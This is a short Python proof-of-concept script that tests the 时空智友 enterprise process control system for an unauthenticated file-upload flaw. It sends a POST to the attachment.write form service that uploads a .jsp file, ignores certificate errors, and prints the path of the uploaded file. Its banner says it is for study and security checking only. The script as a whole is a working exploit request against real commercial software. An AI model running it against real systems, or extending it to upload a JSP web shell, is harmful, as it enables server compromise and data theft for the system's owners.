import requests
import time
import argparse
import re
import sys

def title():
    print("")
    print("")
    print('+------------------------------------------------------------+')
    print('时空智友企业流程化管控系统文件上传漏洞检测')
    print("仅限学习使用或安全排查使用，请勿用于非法测试！")
    print('使用方式：skzy.py -u http://www.example.com')
    print('+------------------------------------------------------------+')
    print("")
def poc(url):
    headers= {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36"
    }
    data='''123'''
    # 无视证书不报错
    requests.packages.urllib3.disable_warnings()
    try:
        req=requests.post(url+"/formservice?service=attachment.write&isattach=false&filename=test1.jsp",headers=headers,timeout=10,verify=False,data=data)
    except:
        print("请检查目标是否可访问，或不存在漏洞")
        sys.exit()
    try:
        text=req.text.encode("iso-8859-1").decode("utf-8")
        pattern = r"<root>(.*?)<\/root>"
        match = re.search(pattern, text)
        if match:
            extracted_content = match.group(1)
            print("文件上传成功路径为 /form/temp/"+extracted_content)
        else:
            print("漏洞不存在")
    except:
        print("漏洞不存在")
        sys.exit()


def arg():
    parser = argparse.ArgumentParser(description="Simple command line tool")
    parser.add_argument("-u", "--url", required=True, help="URL to target")
    args = parser.parse_args()
    url = args.url
    return url

if __name__ == '__main__':
    title()
    url=arg()
    poc(url)